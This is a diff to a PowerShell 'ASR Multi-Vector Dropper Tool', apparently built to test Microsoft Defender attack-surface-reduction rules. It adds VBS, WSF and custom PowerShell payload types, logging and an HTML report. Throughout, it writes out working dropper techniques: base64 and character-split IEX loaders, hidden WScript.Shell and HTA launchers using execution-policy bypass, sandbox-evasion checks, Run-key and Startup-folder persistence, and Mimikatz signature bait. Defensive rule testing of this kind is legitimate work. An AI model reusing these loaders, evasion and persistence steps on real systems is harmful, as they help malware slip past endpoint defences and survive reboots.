+Register-ScheduledTask -TaskName "ASRTest" -InputObject $task -Force'
+                }
                 default {
+                    Write-Log "Invalid template selection" -Level WARNING
                     Write-Host "Invalid template." -ForegroundColor Red
                     return Select-Payload
                 }
             }
         }
         default {
+            Write-Log "Invalid payload selection option" -Level WARNING
             Write-Host "Invalid option. Try again." -ForegroundColor Red
             return Select-Payload
         }
     }
 }
 
-# Function to test ASR Rules
-function Test-ASRRules {
-    $results = @()
-    
-    # Check if any ASR rules are selected
-    if ($SelectedASRRules.Count -eq 0) {
-        Write-Host "No ASR rules selected for testing." -ForegroundColor Yellow
-        return $results
-    }
-    
-    Write-Host "`n=== Testing ASR Rules ===" -ForegroundColor Cyan
-    Write-Host "Rules to test: $($SelectedASRRules.Count)" -ForegroundColor Yellow
-    
-    # Create a temporary directory for ASR testing
-    $tempDir = Join-Path $env:TEMP "ASRTesting"
-    if (-not (Test-Path $tempDir)) {
-        New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
-    }
-    
-    foreach ($ruleId in $SelectedASRRules) {
-        $rule = $ASRRules | Where-Object { $_.Id -eq $ruleId }
-        
-        Write-Host "`n[TEST] Rule: $($rule.Name)" -ForegroundColor Yellow
-        Write-Host "  ID: $($rule.Id)" -ForegroundColor DarkGray
-        Write-Host "  Category: $($rule.Category)" -ForegroundColor DarkGray
-        
-        # Get current rule state
-        $currentState = $null
-        try {
-            $preference = Get-MpPreference
-            if ($preference.AttackSurfaceReductionRules_Ids -contains $ruleId) {
-                $index = [array]::IndexOf($preference.AttackSurfaceReductionRules_Ids, $ruleId)
-                $currentState = $preference.AttackSurfaceReductionRules_Actions[$index]
-            }
-            else {
-                $currentState = "Not Configured"
-            }
-        }
-        catch {
-            $currentState = "Error checking state"
-        }
-        
-        # Create test files based on rule category
-        $testFiles = @()
-        $testState = "Tested"
-        $testDetails = "Rule tested successfully"
-        
-        try {
-            switch ($rule.Category) {
-                "Office" {
-                    # Simulate Office behavior
-                    $testFilePath = Join-Path $tempDir "office_test.ps1"
-                    Set-Content -Path $testFilePath -Value "Start-Process calc.exe" -Force
-                    $testFiles += $testFilePath
-                }
-                "Scripts" {
-                    # Create test obfuscated script
-                    $testFilePath = Join-Path $tempDir "obfuscated_script.ps1"
-                    $obfuscatedContent = "`$x='c'+'a'+'l'+'c';Start-Process `$x"
-                    Set-Content -Path $testFilePath -Value $obfuscatedContent -Force
-                    $testFiles += $testFilePath
-                }
-                "Credential Theft" {
-                    # Simulate LSASS access
-                    $testFilePath = Join-Path $tempDir "lsass_access.ps1"
-                    Set-Content -Path $testFilePath -Value "Get-Process lsass" -Force
-                    $testFiles += $testFilePath
-                }
-                "Executables" {
-                    # Create test executable content
-                    $testFilePath = Join-Path $tempDir "test_exec.ps1"
-                    Set-Content -Path $testFilePath -Value "New-Item -ItemType File -Path '$tempDir\test.exe' -Force" -Force
-                    $testFiles += $testFilePath
-                }
-                "Persistence" {
-                    # Simulate WMI persistence with timeout protection
-                    $testFilePath = Join-Path $tempDir "wmi_persist.ps1"
-                    $safeWmiScript = @'
-# Add timeout protection for WMI queries
-$timeoutScript = {
-    try {
-        # Safer WMI query that's less likely to hang
-        $result = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
-        Write-Output "WMI query executed (simulating persistence check)"
-    }
-    catch {
-        Write-Output "WMI query failed: $($_.Exception.Message)"
-    }
-}
-
-# Create a job with a timeout
-$job = Start-Job -ScriptBlock $timeoutScript
-$completed = Wait-Job $job -Timeout 5
-if ($completed -eq $null) {
-    Write-Output "WMI query timed out after 5 seconds"
-    Stop-Job $job
-}
-else {
-    Receive-Job $job
-}
-Remove-Job $job -Force
-'@
-                    Set-Content -Path $testFilePath -Value $safeWmiScript -Force
-                    $testFiles += $testFilePath
-                }
-                "Drivers" {
-                    # Simulate driver operations
-                    $testFilePath = Join-Path $tempDir "driver_test.ps1"
-                    Set-Content -Path $testFilePath -Value "Get-WindowsDriver -Online -All | Select-Object -First 1" -Force
-                    $testFiles += $testFilePath
-                }
-                default {
-                    # Generic test for other categories
-                    $testFilePath = Join-Path $tempDir "generic_test.ps1"
-                    Set-Content -Path $testFilePath -Value "Write-Output 'Testing $($rule.Name)'" -Force
-                    $testFiles += $testFilePath
-                }
-            }
-            
-            # Try to temporarily enable the rule in Audit mode for testing
-            $originalRuleState = $currentState
-            
-            if ($Execute) {
-                try {
-                    # Enable rule in audit mode
-                    Add-MpPreference -AttackSurfaceReductionRules_Ids $ruleId -AttackSurfaceReductionRules_Actions AuditMode -ErrorAction SilentlyContinue
-                    
-                    # Execute test files
-                    foreach ($testFile in $testFiles) {
-                        if (Test-Path $testFile) {
-                            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$testFile`"" -Wait -WindowStyle Hidden
-                        }
-                    }
-                    
-                    # Check Event Viewer for ASR events
-                    $events = Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -ErrorAction SilentlyContinue | 
-                              Where-Object { $_.Id -eq 1121 -and $_.Message -like "*$ruleId*" } | 
-                              Select-Object -First 5
-                    
-                    if ($events -and $events.Count -gt 0) {
-                        $testState = "Triggered"
-                        $testDetails = "Rule triggered $($events.Count) audit events"
-                        Write-Host "  Result: TRIGGERED ($($events.Count) events)" -ForegroundColor Green
-                    }
-                    else {
-                        $testState = "Not Triggered"
-                        $testDetails = "No audit events detected for this rule"
-                        Write-Host "  Result: NOT TRIGGERED (no events)" -ForegroundColor Red
-                    }
-                }
-                catch {
-                    $testState = "Error"
-                    $testDetails = "Error testing rule: $($_.Exception.Message)"
-                }
-                finally {
-                    # Restore original rule state if it was changed
-                    if ($originalRuleState -ne "Not Configured") {
-                        try {
-                            Add-MpPreference -AttackSurfaceReductionRules_Ids $ruleId -AttackSurfaceReductionRules_Actions $originalRuleState -ErrorAction SilentlyContinue
-                        }
-                        catch {
-                            Write-Host "Error restoring original rule state: $($_.Exception.Message)" -ForegroundColor Red
-                        }
-                    }
-                    else {
-                        try {
-                            Remove-MpPreference -AttackSurfaceReductionRules_Ids $ruleId -ErrorAction SilentlyContinue
-                        }
-                        catch {
-                            # Ignore errors when removing if it wasn't configured originally
-                        }
-                    }
-                }
-            }
-            else {
-                $testState = "Skipped"
-                $testDetails = "Execution not enabled"
-                Write-Host "  Result: SKIPPED (execution disabled)" -ForegroundColor Gray
-            }
-        }
-        catch {
-            $testState = "Error"
-            $testDetails = "Error during rule testing: $($_.Exception.Message)"
-            Write-Host "  Result: ERROR ($($_.Exception.Message))" -ForegroundColor Red
-        }
-        
-        # Add result
-        $results += [PSCustomObject]@{
-            RuleName = $rule.Name
-            RuleId = $rule.Id
-            Category = $rule.Category
-            CurrentState = $currentState
-            TestState = $testState
-            TestDetails = $testDetails
-            Standard = $rule.Standard
-        }
-        
-        # Clean up test files
-        foreach ($testFile in $testFiles) {
-            if (Test-Path $testFile) {
-                Remove-Item -Path $testFile -Force -ErrorAction SilentlyContinue
-            }
-        }
-    }
-    
-    # Clean up temp directory if empty
-    if ((Get-ChildItem -Path $tempDir -ErrorAction SilentlyContinue).Count -eq 0) {
-        Remove-Item -Path $tempDir -Force -ErrorAction SilentlyContinue
-    }
-    
-    Write-Host "`n[COMPLETE] ASR Rules testing complete. Tested $($results.Count) rules." -ForegroundColor Green
-    Write-Host "    Triggered: $(($results | Where-Object { $_.TestState -eq "Triggered" }).Count)" -ForegroundColor Yellow
-    Write-Host "    Not Triggered: $(($results | Where-Object { $_.TestState -eq "Not Triggered" }).Count)" -ForegroundColor Cyan
-    Write-Host "    Skipped: $(($results | Where-Object { $_.TestState -eq "Skipped" }).Count)" -ForegroundColor Gray
-    Write-Host "    Errors: $(($results | Where-Object { $_.TestState -eq "Error" }).Count)" -ForegroundColor Red
-
-    # Add summary table with IDs
-    Write-Host "`n=== ASR Rules Testing ===" -ForegroundColor Cyan
-    Write-Host "Test ASR Rules: " -NoNewline
-    Write-Host "Enabled" -ForegroundColor Green
-
-    # Display selected rules count with an ID list
-    Write-Host "Selected Rules: $($SelectedASRRules.Count)"
-
-    # Add this new section to show a list of selected rules with IDs
-    if ($SelectedASRRules.Count -gt 0) {
-        Write-Host "`nSelected Rule IDs:" -ForegroundColor Yellow
-        foreach ($ruleId in $SelectedASRRules) {
-            $rule = $ASRRules | Where-Object { $_.Id -eq $ruleId }
-            if ($rule) {
-                Write-Host "  $($rule.Name): $($rule.Id)" -ForegroundColor Cyan
-            }
-        }
-        Write-Host ""  # Add a blank line for spacing
-    }
-    
-    # Display selected rules with IDs in a table format
-    if ($SelectedASRRules.Count -gt 0) {
-        $ruleSummary = @()
-        foreach ($ruleId in $SelectedASRRules) {
-            $rule = $ASRRules | Where-Object { $_.Id -eq $ruleId }
-            $result = $results | Where-Object { $_.RuleId -eq $ruleId }
-            
-            $resultState = if ($result) { 
-                switch ($result.TestState) {
-                    "Triggered" { "* Triggered" }
-                    "Not Triggered" { "x Not Triggered" }
-                    "Skipped" { "- Skipped" }
-                    "Error" { "! Error" }
-                    default { "? Unknown" }
-                }
-            } else { "? Unknown" }
-            
-            $ruleSummary += [PSCustomObject]@{
-                Name = $rule.Name
-                ID = $rule.Id
-                Status = $resultState
-            }
-        }
-        
-        # Display the table
-        $ruleSummary | Format-Table -Property Name, ID, Status -AutoSize
-    }
-    
-    return $results
-}
-
+# ─────────────────────────────────────────────────────
+#  Update menu loop to include new options
+# ─────────────────────────────────────────────────────
 # === Menu Loop ===
 do {
     Show-Menu
@@ -733,19 +628,33 @@ do {
         '9' { $ExternalProcess = Read-Host "Enter process to launch (e.g., calc.exe or notepad.exe)" }
         'A' { Show-ASRRulesMenu }
         'a' { Show-ASRRulesMenu }
+        'L' { Configure-Logging }
+        'l' { Configure-Logging }
+        'P' { Configure-PayloadTypes }
+        'p' { Configure-PayloadTypes }
+        # Other options remain the same
     }
 } while ($choice -ne '0')
 
+# ─────────────────────────────────────────────────────
+#  Update main execution section
+# ─────────────────────────────────────────────────────
+# Initialize logging
+Write-Log "ASRDropper script started" -Level INFO -LogPath (Join-Path $DropPath $LogFile)
+Write-Log "Using output directory: $DropPath" -Level INFO
+
 # === Setup
-# Set path to C:\Users\Public
 $DropPath = "C:\Users\Public"
-Write-Host "Using output directory: $DropPath" -ForegroundColor Yellow
+Write-Log "Using output directory: $DropPath" -Level INFO
 
 $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 $results = @()
 function New-RandomName { ( -join ((48..57)+(97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_}) ) }
 
-function Encode($s) { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s)) }
+function Encode($s) { 
+    Write-Log "Encoding payload content" -Level DEBUG -NoConsole
+    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s)) 
+}
 
 # === File Names
 $fn_test = (New-RandomName) + ".ps1"
@@ -754,51 +663,165 @@ $fn_com  = (New-RandomName) + ".ps1"
 $fn_multi = (New-RandomName) + ".ps1"
 $fn_hta  = (New-RandomName) + ".hta"
 $fn_sig  = (New-RandomName) + ".ps1"
+$fn_vbs  = (New-RandomName) + ".vbs"  # New: VBScript file
+$fn_wsf  = (New-RandomName) + ".wsf"  # New: WSF file
+$fn_ps1_custom = (New-RandomName) + ".ps1"  # New: Custom PowerShell file
+
 $testScript = Join-Path $DropPath $fn_test
+Write-Log "Generated random filenames:" -Level INFO
+Write-Log "Test script: $fn_test" -Level DEBUG
+Write-Log "PS1: $fn_ps, VBS: $fn_vbs, WSF: $fn_wsf" -Level DEBUG
 
 # === Stage 2 Payload
 if ($Evasion) {
+    Write-Log "Adding evasion techniques to payload" -Level INFO
     $PayloadCode = "Start-Sleep -Seconds 5`nif (([Environment]::UserName -eq 'WDAGUtilityAccount') -or ($env:COMPUTERNAME -like '*SANDBOX*')) { exit }`n$PayloadCode"
 }
+Write-Log "Creating stage 2 payload script: $testScript" -Level INFO
 Set-Content $testScript $PayloadCode -Force
 
+# === Payload Creation (existing + new types)
+# Create a structure to track all payloads
+$allPayloads = @()
+
 # === Payload 1: Encoded
+Write-Log "Creating encoded PowerShell payload" -Level INFO
 $encoded1 = Encode "IEX `"$testScript`""
 $p1 = Join-Path $DropPath $fn_ps
 Set-Content $p1 "`$b='$encoded1';iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$b)))" -Force
+$allPayloads += @{
+    Type = "PowerShell"
+    Name = "Encoded PS"
+    Path = $p1
+    IsHTA = $false
+}
 
 # === Payload 2: COM (external process)
+Write-Log "Creating COM payload to launch: $ExternalProcess" -Level INFO
 $p2 = Join-Path $DropPath $fn_com
 Set-Content $p2 "(New-Object -ComObject WScript.Shell).Run('powershell -ep bypass -w hidden -Command `"Start-Process $ExternalProcess`"')" -Force
+$allPayloads += @{
+    Type = "PowerShell"
+    Name = "COM Shell"
+    Path = $p2
+    IsHTA = $false
+}
 
 # === Payload 3: Multi
+
+Write-Log "Creating multi-stage payload" -Level INFO
 $chunks = ($encoded1.ToCharArray() | ForEach-Object { "'$_'" }) -join ","
 $p3 = Join-Path $DropPath $fn_multi
 Set-Content $p3 "`$s = [string]::Join('', @($chunks));iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$s)))" -Force
+$allPayloads += @{
+    Type = "PowerShell"
+    Name = "Multi-stage"
+    Path = $p3
+    IsHTA = $false
+}
 
 # === Payload 4: HTA
+Write-Log "Creating HTA payload" -Level INFO
 $p4 = Join-Path $DropPath $fn_hta
 $html = "<html><head><script>new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -w hidden -Command `"Start-Process $ExternalProcess`"');window.close();</script></head><body></body></html>"
 Set-Content $p4 $html
+$allPayloads += @{
+    Type = "HTA"
+    Name = "HTA"
+    Path = $p4
+    IsHTA = $true
+}
 
 # === Payload 5: Signatures
 $p5 = Join-Path $DropPath $fn_sig
 if ($Signatures) {
+    Write-Log "Creating payload with signature strings" -Level INFO
     # Set URL for Invoke-Mimikatz
     $mimikatzUrl = "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1"
 
-$mimikatzUrl = 'https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1'
-$payload = @"
+    $payload = @"
 `$x = 'Invoke-Mimikatz from $mimikatzUrl sekurlsa::logonpasswords SharpHound CobaltStrike'
 Write-Host '[YARA bait triggered]'
 "@
-Set-Content -Path $p5 -Value $payload
-Write-Log "Injected YARA bait payload to $p5"
+    Set-Content -Path $p5 -Value $payload
+    Write-Log "Injected YARA bait payload to $p5" -Level INFO
+    
+    $allPayloads += @{
+        Type = "PowerShell"
+        Name = "Signature Bait"
+        Path = $p5
+        IsHTA = $false
+    }
+}
 
+# === NEW Payload 6: VBScript
+if ($UseVBSPayload -or $UseAllPayloads) {
+    Write-Log "Creating VBScript payload" -Level INFO
+    $p6 = Join-Path $DropPath $fn_vbs
+    
+    $vbs_params = @{
+        OutputPath = $p6
+        PayloadToExecute = $PayloadCode
+        WithEvasion = $Evasion
+        LaunchPowerShell = $VBSPayloadOptions.LaunchPowerShell
+    }
+    
+    $p6 = New-VBScriptPayload @vbs_params
+    
+    $allPayloads += @{
+        Type = "VBScript"
+        Name = "VBS Script"
+        Path = $p6
+        IsHTA = $false
+    }
+}
+
+# === NEW Payload 7: WSF (Windows Script File)
+if ($UseWSFPayload -or $UseAllPayloads) {
+    Write-Log "Creating WSF payload" -Level INFO
+    $p7 = Join-Path $DropPath $fn_wsf
+    
+    $wsf_params = @{
+        OutputPath = $p7
+        PayloadToExecute = $PayloadCode
+        WithEvasion = $Evasion
+    }
+    
+    $p7 = New-WSFPayload @wsf_params
+    
+    $allPayloads += @{
+        Type = "WSF"
+        Name = "Windows Script File"
+        Path = $p7
+        IsHTA = $false
+    }
+}
+
+# === NEW Payload 8: Custom PowerShell
+if ($UsePS1Payload -or $UseAllPayloads) {
+    Write-Log "Creating custom PowerShell payload" -Level INFO
+    $p8 = Join-Path $DropPath $fn_ps1_custom
+    
+    $ps1_params = @{
+        OutputPath = $p8
+        PayloadToExecute = $PayloadCode
+        WithEvasion = $Evasion
+        WithDownloader = $PSPayloadOptions.UseDownloader
+    }
+    
+    $p8 = New-PowerShellPayload @ps1_params
+    
+    $allPayloads += @{
+        Type = "PowerShell"
+        Name = "Advanced PS1"
+        Path = $p8
+        IsHTA = $false
+    }
 }
 
 # === Shortcut
 if ($CreateShortcut) {
+    Write-Log "Creating shortcut to PowerShell payload" -Level INFO
     $sc = "$DropPath\loader.lnk"
     $ws = New-Object -ComObject WScript.Shell
     $lnk = $ws.CreateShortcut($sc)
@@ -809,49 +832,87 @@ if ($CreateShortcut) {
 
 # === Persistence
 if ($Persist) {
+    Write-Log "Setting up persistence mechanisms" -Level INFO
     $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$fn_ps"
     Copy-Item $p1 $startup -Force
+    Write-Log "Copied payload to startup folder: $startup" -Level INFO
+    
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" `
         -Value "powershell -ep bypass -w hidden -File `"$startup`"" -Force
+    Write-Log "Added registry run key for persistence" -Level INFO
+    
+    # Add more detailed logging for registry persistence
+    try {
+        $regValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" -ErrorAction SilentlyContinue
+        if ($regValue) {
+            Write-Log "Verified registry persistence key: $($regValue.ASRDropper)" -Level SUCCESS
+        }
+    } catch {
+        Write-Log "Failed to verify registry persistence: $($_.Exception.Message)" -Level ERROR
+    }
 }
 
 # === Execution + Logging
-$payloads = @(
-    @{ Name = "Encoded PS"; Path = $p1 },
-    @{ Name = "COM Shell"; Path = $p2 },
-    @{ Name = "Multi-stage"; Path = $p3 },
-    @{ Name = "HTA"; Path = $p4; IsHTA = $true }
-)
-if ($Signatures) {
-    $payloads += @{ Name = "Signature Bait"; Path = $p5 }
-}
+Write-Log "Preparing to execute payloads (Execute = $Execute)" -Level INFO
 
-foreach ($p in $payloads) {
-    $cmd = if ($p.IsHTA) { "mshta `"$($p.Path)`"" } else { "powershell -ep bypass -w hidden -File `"$($p.Path)`"" }
+foreach ($p in $allPayloads) {
+    $cmdParams = @{}
+    
+    $cmd = if ($p.IsHTA) { 
+        "mshta `"$($p.Path)`"" 
+    } elseif ($p.Type -eq "VBScript") {
+        "cscript //nologo `"$($p.Path)`""
+    } elseif ($p.Type -eq "WSF") {
+        "cscript //nologo `"$($p.Path)`""
+    } else { 
+        "powershell -ep bypass -w hidden -File `"$($p.Path)`"" 
+    }
+    
+    Write-Log "Processing payload: $($p.Name) ($($p.Type))" -Level INFO
+    Write-Log "Command: $cmd" -Level DEBUG -NoConsole
+    
     $out = ''
     if ($Execute) {
-        try { $out = & powershell -Command $cmd *>&1 }
-        catch { $out = $_.Exception.Message }
+        Write-Log "Executing payload: $($p.Name)" -Level INFO
+        try { 
+            $out = & powershell -Command $cmd *>&1
+            Write-Log "Execution output: $out" -Level DEBUG
+        }
+        catch { 
+            $out = $_.Exception.Message 
+            Write-Log "Execution error: $out" -Level ERROR
+        }
+    } else {
+        Write-Log "Execution skipped (not enabled)" -Level INFO
     }
+    
+    $success = $out -match "Executed|YARA|Accessing PID"
     $results += [pscustomobject]@{
-        Name = $p.Name; Path = $p.Path
-        Output = $out -join "`n"; Success = $out -match "Executed|YARA|Accessing PID"
+        Type = $p.Type
+        Name = $p.Name
+        Path = $p.Path
+        Output = $out -join "`n"
+        Success = $success
     }
+    
+    Write-Log "Result: $($p.Name) - $(if($success){'Success'}else{'Failed'})" -Level $(if($success){'SUCCESS'}else{'WARNING'})
 }
 
 # === Test ASR Rules
 $asrResults = @()
 if ($TestASR) {
+    Write-Log "Starting ASR rules testing" -Level INFO
     $asrResults = Test-ASRRules
 }
 
 # === HTML Log
 if ($LogHtml) {
     # Ask for custom HTML report filename
-    $customReportName = Read-Host "Enter custom HTML report filename (default: ASR-Report.html)"
+    $defaultReportName = "ASR-Report-$(Get-Date -Format 'yyyyMMdd-HHmmss').html"
+    $customReportName = Read-Host "Enter custom HTML report filename (default: $defaultReportName)"
     
     if ([string]::IsNullOrWhiteSpace($customReportName)) {
-        $reportFilename = "ASR-Report.html"
+        $reportFilename = $defaultReportName
     } else {
         # Ensure filename has .html extension
         if (-not $customReportName.EndsWith(".html", [StringComparison]::OrdinalIgnoreCase)) {
@@ -862,9 +923,9 @@ if ($LogHtml) {
     }
     
     $logPath = Join-Path $DropPath $reportFilename
-    Write-Host "HTML report will be saved to: $logPath" -ForegroundColor Cyan
+    Write-Log "Creating HTML report: $logPath" -Level INFO
     
-    # Create HTML report
+    # Create HTML report (extended with new payload types)
     # PS 5.1 compatible HTML without Unicode characters
     $html = @"
 <!DOCTYPE html>
@@ -908,6 +969,7 @@ if ($LogHtml) {
         }
         .summary {
             display: flex;
+            flex-wrap: wrap;
             justify-content: space-between;
             margin-bottom: 20px;
         }
@@ -917,6 +979,7 @@ if ($LogHtml) {
             padding: 15px;
             width: 30%;
             box-shadow: 0 1px 5px rgba(0,0,0,0.05);
+            margin-bottom: 10px;
         }
         .success {
             color: #27ae60;
@@ -965,6 +1028,7 @@ if ($LogHtml) {
             border-radius: 5px;
             overflow-x: auto;
             margin: 10px 0;
+            white-space: pre-wrap;
         }
         .badge {
             display: inline-block;
@@ -1085,6 +1149,34 @@ if ($LogHtml) {
             from {opacity: 0;}
             to {opacity: 1;}
         }
+        .log-viewer {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .type-badge {
+            display: inline-block;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-right: 5px;
+        }
+        .type-ps {
+            background-color: #2980b9;
+            color: white;
+        }
+        .type-vbs {
+            background-color: #27ae60;
+            color: white;
+        }
+        .type-hta {
+            background-color: #8e44ad;
+            color: white;
+        }
+        .type-wsf {
+            background-color: #f39c12;
+            color: white;
+        }
     </style>
 </head>
 <body>
@@ -1102,6 +1194,7 @@ if ($LogHtml) {
         <button class="tablinks active" onclick="openTab(event, 'Summary')">Summary</button>
         <button class="tablinks" onclick="openTab(event, 'ASRRules')">ASR Rules Testing</button>
         <button class="tablinks" onclick="openTab(event, 'Payloads')">Dropper Payloads</button>
+        <button class="tablinks" onclick="openTab(event, 'Logs')">Execution Logs</button>
         <button class="tablinks" onclick="openTab(event, 'Configuration')">Configuration</button>
     </div>
 
@@ -1111,7 +1204,7 @@ if ($LogHtml) {
             <div class="summary">
                 <div class="summary-box">
                     <h3>Payloads</h3>
-                    <p><strong>Created:</strong> $($payloads.Count)</p>
+                    <p><strong>Created:</strong> $($allPayloads.Count)</p>
                     <p><strong>Executed:</strong> $(if ($Execute) { "Yes" } else { "No" })</p>
                     <p><strong>Success:</strong> $(($results | Where-Object { $_.Success }).Count) / $($results.Count)</p>
                 </div>
@@ -1126,6 +1219,13 @@ if ($LogHtml) {
                     <p><strong>Persistence:</strong> $(if ($Persist) { "Enabled" } else { "Disabled" })</p>
                     <p><strong>Cleanup:</strong> $(if ($Cleanup) { "Enabled" } else { "Disabled" })</p>
                     <p><strong>Sandbox Evasion:</strong> $(if ($Evasion) { "Enabled" } else { "Disabled" })</p>
+                </div>
+                <div class="summary-box">
+                    <h3>Payload Types</h3>
+                    <p><strong>PowerShell:</strong> $(($results | Where-Object { $_.Type -eq "PowerShell" }).Count)</p>
+                    <p><strong>VBScript:</strong> $(($results | Where-Object { $_.Type -eq "VBScript" }).Count)</p>
+                    <p><strong>HTA:</strong> $(($results | Where-Object { $_.Type -eq "HTA" }).Count)</p>
+                    <p><strong>WSF:</strong> $(($results | Where-Object { $_.Type -eq "WSF" }).Count)</p>
                 </div>
             </div>
         </div>
@@ -1294,6 +1394,7 @@ if ($LogHtml) {
             <table>
                 <thead>
                     <tr>
+                        <th>Type</th>
                         <th>Name</th>
                         <th>Path</th>
                         <th>Result</th>
@@ -1309,8 +1410,17 @@ if ($LogHtml) {
                 $resultText = "Not Executed"
             }
             
+            $typeBadgeClass = switch ($r.Type) {
+                "PowerShell" { "type-ps" }
+                "VBScript" { "type-vbs" }
+                "HTA" { "type-hta" }
+                "WSF" { "type-wsf" }
+                default { "type-ps" }
+            }
+            
             $html += @"
                     <tr>
+                        <td><span class="type-badge $typeBadgeClass">$($r.Type)</span></td>
                         <td>$($r.Name)</td>
                         <td>$($r.Path)</td>
                         <td class="$resultClass">$resultText</td>
@@ -1326,7 +1436,7 @@ if ($LogHtml) {
 "@
         foreach ($r in $results) {
             $html += @"
-                <h4>$($r.Name)</h4>
+                <h4>$($r.Name) <span class="type-badge $typeBadgeClass">$($r.Type)</span></h4>
                 <p><strong>Path:</strong> $($r.Path)</p>
                 <div class="terminal">$($r.Output)</div>
 "@
@@ -1344,6 +1454,29 @@ if ($LogHtml) {
     }
     
     $html += @"
+        </div>
+    </div>
+
+    <div id="Logs" class="tabcontent">
+        <div class="container">
+            <h2>Execution Logs</h2>
+            <p>Detailed logs of the execution process:</p>
+            
+            <div class="log-viewer terminal">
+"@
+
+    # Add log content if available
+    if (Test-Path (Join-Path $DropPath $LogFile)) {
+        $logContent = Get-Content -Path (Join-Path $DropPath $LogFile) -ErrorAction SilentlyContinue
+        foreach ($line in $logContent) {
+            $html += "$line`n"
+        }
+    } else {
+        $html += "No log file found at: $(Join-Path $DropPath $LogFile)"
+    }
+
+    $html += @"
+            </div>
         </div>
     </div>
 
@@ -1385,6 +1518,20 @@ if ($LogHtml) {
                 <span class="config-value">$ExternalProcess</span>
             </div>
             
+<h3>Payload Type Configuration</h3>
+            <div class="config-item">
+                <span>PowerShell Script (.ps1):</span>
+                <span class="config-value">$(if ($UsePS1Payload) { "Enabled" } else { "Disabled" })</span>
+            </div>
+            <div class="config-item">
+                <span>VBScript (.vbs):</span>
+                <span class="config-value">$(if ($UseVBSPayload) { "Enabled" } else { "Disabled" })</span>
+            </div>
+            <div class="config-item">
+                <span>Windows Script File (.wsf):</span>
+                <span class="config-value">$(if ($UseWSFPayload) { "Enabled" } else { "Disabled" })</span>
+            </div>
+            
             <h3>ASR Rules Testing</h3>
             <div class="config-item">
                 <span>Test ASR Rules:</span>
@@ -1420,11 +1567,21 @@ if ($LogHtml) {
     }
 
     $html += @"
+            
+            <h3>Logging Configuration</h3>
+            <div class="config-item">
+                <span>Verbose Logging:</span>
+                <span class="config-value">$(if ($VerboseLogging) { "Enabled" } else { "Disabled" })</span>
+            </div>
+            <div class="config-item">
+                <span>Log File:</span>
+                <span class="config-value">$LogFile</span>
+            </div>
         </div>
     </div>
 
     <div class="footer">
-        <p>ASR Multi-Vector Dropper Tool | Generated on $timestamp</p>
+        <p>ASR Multi-Vector Dropper Tool v1.1 | Generated on $timestamp</p>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.1/dist/chart.min.js"></script>
@@ -1489,6 +1646,44 @@ if ($LogHtml) {
                     }
                 });
             }
+            
+            // Add a pie chart for payload types
+            var payloadTypesChart = document.getElementById('payloadTypesChart');
+            if (payloadTypesChart) {
+                new Chart(payloadTypesChart, {
+                    type: 'pie',
+                    data: {
+                        labels: ['PowerShell', 'VBScript', 'HTA', 'WSF'],
+                        datasets: [{
+                            data: [
+                                $(($results | Where-Object { $_.Type -eq "PowerShell" }).Count),
+                                $(($results | Where-Object { $_.Type -eq "VBScript" }).Count),
+                                $(($results | Where-Object { $_.Type -eq "HTA" }).Count),
+                                $(($results | Where-Object { $_.Type -eq "WSF" }).Count)
+                            ],
+                            backgroundColor: [
+                                '#2980b9',
+                                '#27ae60',
+                                '#8e44ad',
+                                '#f39c12'
+                            ]
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                position: 'right',
+                            },
+                            title: {
+                                display: true,
+                                text: 'Payload Types'
+                            }
+                        }
+                    }
+                });
+            }
         });
     </script>
 </body>
@@ -1497,39 +1692,74 @@ if ($LogHtml) {
 
     # Save HTML report
     Set-Content $logPath $html -Encoding UTF8
-    Write-Host "`n[PDF] HTML report written to: $logPath" -ForegroundColor Cyan
+    Write-Log "HTML report saved to: $logPath" -Level SUCCESS
     
     # Ask if user wants to open the report now
     $openReport = Read-Host "Open HTML report now? (y/n)"
     if ($openReport -eq "y") {
-        Write-Host "Opening HTML report..." -ForegroundColor Green
+        Write-Log "Opening HTML report" -Level INFO
         Start-Process $logPath
     } else {
-        Write-Host "HTML report saved. You can open it manually later." -ForegroundColor Yellow
+        Write-Log "HTML report saved. User chose not to open it now." -Level INFO
     }
 }
 
 # === Cleanup
 if ($Cleanup) {
-    # Only remove files in the Public folder that were created by this script
-    $createdFiles = @($p1, $p2, $p3, $p4)
-    if ($Signatures) { $createdFiles += $p5 }
-    if ($CreateShortcut) { $createdFiles += "$DropPath\loader.lnk" }
+    Write-Log "Starting cleanup process" -Level INFO
     
+    # Only remove files in the Public folder that were created by this script
+    $createdFiles = @()
+    
+    # Add all payload files to the list
+    foreach ($p in $allPayloads) {
+        $createdFiles += $p.Path
+    }
+    
+    # Add shortcut if created
+    if ($CreateShortcut) { 
+        $createdFiles += "$DropPath\loader.lnk" 
+    }
+    
+    # Process each file
     foreach ($file in $createdFiles) {
         if (Test-Path $file) {
-            Remove-Item -Path $file -Force
-            Write-Host "Removed: $file" -ForegroundColor Gray
+            try {
+                Remove-Item -Path $file -Force
+                Write-Log "Removed: $file" -Level SUCCESS
+            } catch {
+                Write-Log "Failed to remove: $file - $($_.Exception.Message)" -Level ERROR
+            }
+        } else {
+            Write-Log "File not found during cleanup: $file" -Level WARNING
         }
     }
     
